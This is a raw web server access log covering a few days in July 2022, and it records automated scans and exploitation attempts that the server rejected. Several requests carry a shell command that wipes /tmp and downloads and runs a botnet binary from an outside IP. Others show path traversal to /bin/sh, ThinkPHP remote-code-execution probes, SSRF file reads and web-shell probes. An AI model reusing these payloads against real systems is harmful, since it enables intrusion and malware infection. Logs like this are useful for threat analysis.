143.198.136.88 - - [09/Jul/2022:21:00:58 +0900] "GET /api/geojson?url=file:///etc/hosts HTTP/1.1" 404 4582 "-" "l9explore/1.3.0"
95.161.131.235 - - [09/Jul/2022:21:18:14 +0900] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 157 "-" "-"
192.187.110.10 - - [09/Jul/2022:22:38:15 +0900] "GET /wp-signin.php?dizo&ping HTTP/1.1" 404 4582 "www.bing.com" "wp_is_mobile"
192.187.110.10 - - [09/Jul/2022:22:38:59 +0900] "GET /wp-content/plugins/wpconfig.bak.php?act=sf HTTP/1.1" 404 4582 "www.bing.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
192.187.110.10 - - [09/Jul/2022:22:39:02 +0900] "GET /system_log.php?bala=up HTTP/1.1" 404 4582 "www.bing.com" "wp_is_mobile"
192.187.110.10 - - [09/Jul/2022:22:39:15 +0900] "GET /admin/controller/extension/extension/ALFA_DATA HTTP/1.1" 404 4582 "www.bing.com" "wp_is_mobile"
192.187.110.10 - - [09/Jul/2022:22:39:16 +0900] "GET /admin/controller/extension/extension/alfacgiapi HTTP/1.1" 404 4582 "www.bing.com" "wp_is_mobile"
192.187.110.10 - - [09/Jul/2022:22:39:16 +0900] "GET /admin/controller/extension/extension/cgialfa HTTP/1.1" 404 4582 "www.bing.com" "wp_is_mobile"
192.187.110.10 - - [09/Jul/2022:22:39:17 +0900] "GET /index.php?3x=3x HTTP/1.1" 404 4582 "www.bing.com" "wp_is_mobile"
197.246.213.53 - - [09/Jul/2022:23:34:40 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.95.169.146/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" 404 12967 "-" "Hello, world"
197.246.213.53 - - [09/Jul/2022:23:34:48 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.95.169.146/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" 404 12967 "-" "Hello, world"
192.241.219.237 - - [09/Jul/2022:23:51:09 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [10/Jul/2022:03:18:41 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.161.131.235 - - [10/Jul/2022:04:34:35 +0900] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 157 "-" "-"
192.241.213.42 - - [10/Jul/2022:11:05:14 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [10/Jul/2022:13:58:08 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [10/Jul/2022:19:21:57 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
192.241.221.20 - - [10/Jul/2022:23:54:02 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [11/Jul/2022:01:45:49 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
27.50.62.50 - - [11/Jul/2022:02:43:15 +0900] "GET /template/21/statics/js/push123.js HTTP/2.0" 404 4569 "/template/21/statics/js/push123.js" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
36.32.203.239 - - [11/Jul/2022:05:14:53 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.95.169.146/bins/aqua.mpsl;sh+/tmp/aqua.mpsl HTTP/1.1" 404 12967 "-" "Hello, world"
185.7.214.104 - - [11/Jul/2022:09:44:25 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
